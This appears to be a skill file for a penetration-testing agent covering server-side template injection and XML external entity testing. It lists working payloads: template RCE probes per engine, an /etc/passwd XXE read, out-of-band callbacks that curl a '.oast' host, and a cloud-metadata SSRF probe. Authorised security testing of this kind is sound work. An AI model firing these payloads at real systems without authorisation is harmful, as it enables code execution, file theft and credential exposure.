---
name: injection-ssti-xxe
description: Server-Side Template Injection (SSTI) and XML External Entity (XXE) testing with engine-specific payloads, safe arithmetic probes, and OOB confirmation for blind cases. Use when parameters are reflected into templates/error messages, or when the app accepts XML/SVG/DOCX/SOAP. OWASP A03/A05, WSTG-INPV-18/07, CWE-1336/611/94.
---

# SSTI & XXE

`dr(){ docker run --rm detech/toolbox:latest "$@"; }`. Confirm with a **unique arithmetic
product absent from a benign baseline** — never a common number.

## Server-Side Template Injection (SSTI)
**Detect (send into any reflected param / name / message field):**
- Polyglot probe: `${{<%[%'"}}%\`. A 500/parse error = template context.
- **Arithmetic confirmation (low-FP):** send `{{1337*1337}}` and require **`1787569`** to appear
  in the response **and be absent from a benign baseline**, and the literal `{{1337*1337}}` NOT
  echoed. (Avoid `{{7*7}}→49`: `49` appears by chance in bundles → false positives.)
  Also try `${1337*1337}`, `#{1337*1337}`, `<%= 1337*1337 %>`, `{{1337*1337}}` for different engines.

**Engine fingerprint → escalation:**
| Engine (stack) | Confirm | RCE probe |
|---|---|---|
| Jinja2 (Python/Flask) | `{{7*7}}` | `{{cycler.__init__.__globals__.os.popen('id').read()}}` |
| Twig (PHP) | `{{7*7}}` | `{{['id']|filter('system')}}` |
| Freemarker (Java) | `${7*7}` | `${"freemarker.template.utility.Execute"?new()("id")}` |
| Velocity (Java) | `#set($x=7*7)$x` | `#set($e=...)$e.getRuntimeMethod(...)` |
| Smarty (PHP) | `{7*7}` | `{system('id')}` |
| ERB (Ruby) | `<%= 7*7 %>` | `<%= \`id\` %>` |
| EJS/Pug/Handlebars (Node) | context-specific | prototype/`process` gadget chains |

Escalate to RCE **only enough to prove impact** (run `id`/`whoami`), never destructive.
Blind SSTI → confirm via OOB (`{{...os.popen('curl http://<cid>.oast')...}}`).

## XXE (XML External Entity)
Target any XML sink: `Content-Type: application/xml`, SOAP, SVG upload, DOCX/XLSX/ODT,
RSS, SAML, config import.

**Classic file read:**
```xml
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<r>&xxe;</r>
```
Confirm with `root:.*:0:0:` in the response. Windows: `file:///c:/windows/win.ini`.

**Blind / OOB XXE (no reflection)** — use interactsh (`server-side-ssrf-lfi` / OOB):
```xml
<!DOCTYPE r [
  <!ENTITY % ext SYSTEM "http://<cid>.oast/x.dtd">
  %ext;
]>
```
An HTTP/DNS callback confirms it. **Error-based OOB exfil** via external DTD when direct read
is blocked. Also test **SSRF via XXE** (`SYSTEM "http://169.254.169.254/..."`), billion-laughs
only as a *documented risk*, never actually run a DoS.

**SVG XXE:** upload an SVG containing the DOCTYPE above; check if the rendered/returned image
leaks file content.

## Confirmation discipline
- SSTI: unique product present in payload response, absent from baseline, literal not echoed.
- XXE: file marker (`root:.*:0:0:`) in response OR an OOB callback for blind.

## Analysis & recording
Record payload, engine/parser, exact request+response, CWE (1336 SSTI / 611 XXE), OWASP
**A03**/**A05**, CVSS (SSTI→RCE critical; XXE high/critical), impact (RCE / file disclosure /
SSRF), remediation (logic-less/sandboxed templates, no user input in template source; disable
DTD & external entities in the XML parser). Pass `validation-gates`.
